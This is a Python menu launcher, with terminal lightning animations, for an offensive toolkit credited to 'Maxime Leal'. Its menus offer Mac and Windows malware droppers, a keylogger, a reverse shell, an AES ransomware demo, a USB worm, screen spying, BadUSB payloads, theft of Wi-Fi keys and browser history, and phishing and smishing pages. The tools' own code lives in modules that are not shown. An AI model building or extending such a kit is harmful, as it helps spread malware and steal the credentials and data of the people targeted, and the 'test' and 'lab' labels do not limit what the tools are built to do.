#!/usr/bin/env python3
# language: Python 3, file: flash_tool.py, target: macOS Terminal / iTerm2
# FLASH TOOL_SUPER - powered by Maxime Leal
# 55 tools - malware / osint / recon / badusb / phishing / systeme - menu 6 pages, eclairs
import os, sys, subprocess, time, random, importlib
sys.path.insert(0, os.path.expanduser('~/Desktop/tool_DC'))
import dc_fullscreen as dfs

BASE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(BASE, "modules"))

R, Y, W, RED, DIM, RST = "\033[38;2;255;255;60m", "\033[38;2;255;215;0m", "\033[1;37m", "\033[38;2;255;60;60m", "\033[2m", "\033[0m"
CLR, HOME = "\033[2J", "\033[H"
OUT = os.path.join(BASE, "sorties")
os.makedirs(OUT, exist_ok=True)

BANNER = r"""
   ______  _        ___________ ______   ____    __
  / ____/ /| |      / ____/ ___//  _/  | / __ \  / /
 / /_    / | | /| / / __/  \__ \ / //|  |/ / / / / /
/ __/   /  | |/ |/ / /___ ___/ // // /|  / /_/ / / /____
/_/     /__|__/\__/_____//____/___/_/ |_/_____/_/_____/
        TOOL_SUPER   powered by Maxime Leal
"""

def hid(): print("\033[?25l", end="")
def show(): print("\033[?25h", end="")

def flash(n=3, ms=0.06):
    """impact de foudre plein ecran"""
    for _ in range(n):
        print(CLR + HOME + "\033[48;2;255;255;60m" + " " * 4000 + RST, end="", flush=True)
        time.sleep(ms)
        print(CLR + HOME, end="", flush=True)
        time.sleep(ms * 2)

def bolt(frame):
    """eclair en zigzag qui descend"""
    print(CLR + HOME)
    x = random.randint(20, 60)
    for y in range(1, 22):
        x += random.choice((-2, -1, 0, 1, 2))
        if 0 < x < 78:
            print(f"\x1b[{y};{max(1,x)}H{R}{'/' if random.random()<.5 else chr(92)}{RST}", end="", flush=True)
        time.sleep(0.03)

def speed_lines(ms=0.5):
    """lignes de vitesse rouges/jaunes derriere le titre"""
    end = time.time() + ms
    while time.time() < end:
        line = "".join(random.choice([R, Y, "\033[38;2;255;120;0m"]) + "-" * random.randint(8, 40) + RST for _ in range(random.randint(2, 4)))
        print(CLR + HOME + "\n\n" + line + "\n" * random.randint(2, 4) + line, end="", flush=True)
        time.sleep(0.05)

def title_glitch(txt="FLASH TOOL_SUPER", reps=8):
    for i in range(reps):
        c = R if i % 3 else "\033[38;2;255;255;255m"
        if i % 5 == 0: c = RED
        print(CLR + HOME + ("\n" * 5) + f"\033[1;97m{BANNER}{RST}", end="", flush=True)
        time.sleep(0.07)
    print(CLR + HOME + f"\033[1;97m{BANNER}{RST}", flush=True)

def boot():
    dfs.hid()
    dfs.flash_intro(3.0)
    print(CLR + HOME)
    title_glitch()
    bolt(0)
    flash(2)
    speed_lines(0.5)
    print(CLR + HOME, end="")

def page_banner(p):
    print(CLR + HOME)
    print(f"{W}  ================ FLASH TOOL_SUPER ================{RST}")
    print(f"{Y}   powered by Maxime Leal{DIM}   |   page {p[0]+1}/6 : {p[1]}{RST}")
    bolt_frame = random.choice(["/\\", "\\/", "//", "\\\\"])
    print(f"{R}  {bolt_frame * 24}{RST}")
    print()

def draw(p):
    page_banner((p[0], p[1]))
    for i, (name, desc, fn) in enumerate(p[2]):
        print(f"  {R}[{i+1:>2}]{RST} {W}{name:<28}{RST} {DIM}{desc}{RST}")
    print(f"\n  {Y}[n]{RST} page suivante   {Y}[p]{RST} precedente   {Y}[q]{RST} quitter   {Y}[l]{RST} foudre")

def run_tool(p, idx):
    name, desc, fn = p[2][idx]
    flash(2)
    bolt(0)
    print(f"\n{R}=== {name} ==={RST}\n{DIM}{desc}{RST}\n")
    try:
        fn()
    except Exception as e:
        print(f"{RED}[X] {e}{RST}")
    print(f"\n{DIM}[entree] retour au menu{RST}")
    input()

# ---------------- import des modules ----------------
malware = importlib.import_module("malware")
osint   = importlib.import_module("osint")
recon   = importlib.import_module("recon")
badusb  = importlib.import_module("badusb")
phish   = importlib.import_module("phish")
system  = importlib.import_module("system")

PAGES = [
    ("MALWARE", [
        ("COMPILE KIT MAC",        "build des 10 tools macOS en un coup",        malware.compile_mac),
        ("COMPILE KIT WINDOWS",    "cross-compile les 10 exes PE",               malware.compile_win),
        ("DROPPER MAC",            "genere le .command auto-extractant",         malware.dropper_mac),
        ("DROPPER WINDOWS",        "genere le vbs silencieux + zip",             malware.dropper_win),
        ("KEYLOGGER (test local)", "lance le capteur de frappes local",          malware.run_keylog),
        ("REVERSE SHELL (test)",   "shell sortant vers 127.0.0.1:4444",          malware.run_shell),
        ("SCHWIFTYCRYPT demo",     "AES-256 chiffre/dechiffre un dossier test",  malware.ransom_demo),
        ("USB WORM (test)",        "propagation sur volumes montes",             malware.run_usb),
        ("SCREENSPY 5s",           "captures d'ecran rapides pour test",         malware.run_spy),
        ("NETTOYER MACHINE",       "uninstall complet des agents",               malware.cleanup),
    ]),
    ("OSINT", [
        ("USERNAME HUNT",        "pseudo sur 20+ reseaux, statut HTTP",     osint.username_hunt),
        ("WHOIS DOMAINE",        "registre, dates, serveurs",               osint.whois),
        ("DNS ENUM",             "A/AAAA/MX/NS/TXT d'un domaine",           osint.dns_enum),
        ("SOUS-DOMAINES crt.sh", "certificats TLS -> sous-domaines",        osint.subdomains),
        ("GEOLOC IP",            "ville, ASN, orga d'une IP",               osint.geoloc),
        ("REVERSE IP",           "sites co-heberges sur une IP",            osint.reverse_ip),
        ("HTTP HEADERS",         "technos exposees d'un site",              osint.headers),
        ("EXIF / METADONNEES",   "photos : GPS, appareil, dates",           osint.exif),
        ("WAYBACK HISTORY",      "historique d'archive d'un site",          osint.wayback),
        ("PASTES / LEAKS",       "recherche sur les sites de paste",        osint.pastes),
        ("EMAIL PERMUTATOR",     "genere les formats possibles d'email",    osint.permutator),
        ("GOOGLE DORKS",         "dorks pre-montes sur un domaine",         osint.dorks),
        ("CERTIFICATS TLS",      "SAN et emetteur d'un host",               osint.tls_info),
        ("SOCIAL SCAN",          "profils publics associes a un nom",       osint.social),
        ("BREACH CHECK",         "email dans les fuites publiques",         osint.breach),
    ]),
    ("RECON-RESEAU", [
        ("PING SWEEP /24",       "hototes vivantes du sous-reseau",       recon.ping_sweep),
        ("PORT SCAN",            "scan de ports TCP via nc",              recon.port_scan),
        ("ARP TABLE",            "voisins reseau et adresses MAC",        recon.arp),
        ("CONNEXIONS ACTIVES",   "netstat complet trié",                  recon.netstat),
        ("TRACEROUTE",           "chemin vers une cible",                 recon.trace),
        ("WIFI AUTOUR",          "reseaux visibles, force, canal",        recon.wifi_scan),
        ("MA TABLE WIFI",        "reseaux memorises sur cette machine",   recon.wifi_mine),
        ("IP PUBLIQUE",          "ton IP vue de l'exterieur + geoloc",    recon.pubip),
        ("ROUTE TABLE",          "passerelles et routes actives",         recon.routes),
        ("DNS LEAK TEST",        "qui resout tes requetes DNS",           recon.dns_leak),
    ]),
    ("BADUSB", [
        ("PRANK PLEIN ECRAN",    "message invincible, combo secret pour sortir", badusb.prank_fullscreen),
        ("FAKE BSOD",            "ecran bleu factice plein ecran",               badusb.fake_bsod),
        ("DROPPER MAC (USB)",    "installe le kit via terminal tape",            badusb.dropper_mac),
        ("DROPPER WINDOWS",      "installe le kit via powershell tape",          badusb.dropper_win),
        ("WIFI GRAB WIN",        "exporte les cles wifi sur cle USB",            badusb.wifi_grab),
        ("WALLPAPER SWAP",       "change le fond d'ecran (prank)",               badusb.wallpaper),
        ("MESSAGE SPAMMER",      "popups en boucle (prank)",                     badusb.msg_spam),
        ("HISTORIQUE NAV",       "exfiltration des navigations",                 badusb.browser_dump),
    ]),
    ("PHISHING", [
        ("PAGE LOGIN DEMO",      "page de capture (lab autorise)",       phish.login_page),
        ("TRACKER DE CLICS",     "serveur qui logge IP/UA des clics",    phish.link_tracker),
        ("PRETEXTES EMAIL",      "3 modeles d'emails d'ingenerie",       phish.pretext_email),
        ("PRETEXTES SMS",        "modeles smishing pour le lab",         phish.pretext_sms),
        ("DORK GENERATOR",       "dorks cibles sur un domaine",          phish.dork_gen),
    ]),
    ("SYSTEME", [
        ("CLEFS WIFI MEMORISEES",  "passphrase des reseaux connus",        system.wifi_keys),
        ("PROCESSUS",              "arbre des process en cours",           system.procs),
        ("LAUNCHAGENTS",           "persistance presente sur la machine",  system.agents),
        ("PORTES OUVERTES",        "ports en ecoute locale",               system.ports),
        ("DISQUE",                 "usage des volumes",                    system.disk),
        ("HISTORIQUE TERMINAL",    "dernieres commandes tapees",           system.history),
        ("MATERIEL",               "modele, CPU, RAM, macOS",              system.hw),
    ]),
]

def main():
    boot()
    pi = 0
    while True:
        p = (pi, PAGES[pi][0], PAGES[pi][1])
        draw(p)
        c = input(f"\n  {Y}flash>{RST} ").strip().lower()
        if c == "q":
            flash(3)
            print(CLR + HOME + f"\n{R}⚡⚡⚡  FLASH TOOL_SUPER - powered by Maxime Leal  ⚡⚡⚡{RST}\n\n")
            show()
            return
        elif c == "n":
            pi = (pi + 1) % 6; flash(1)
        elif c == "p":
            pi = (pi - 1) % 6; flash(1)
        elif c == "l":
            for _ in range(3): bolt(0); flash(2)
        elif c.isdigit() and 1 <= int(c) <= 9:
            idx = int(c) - 1
            if idx < len(p[2]): run_tool(p, idx)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        show(); print()
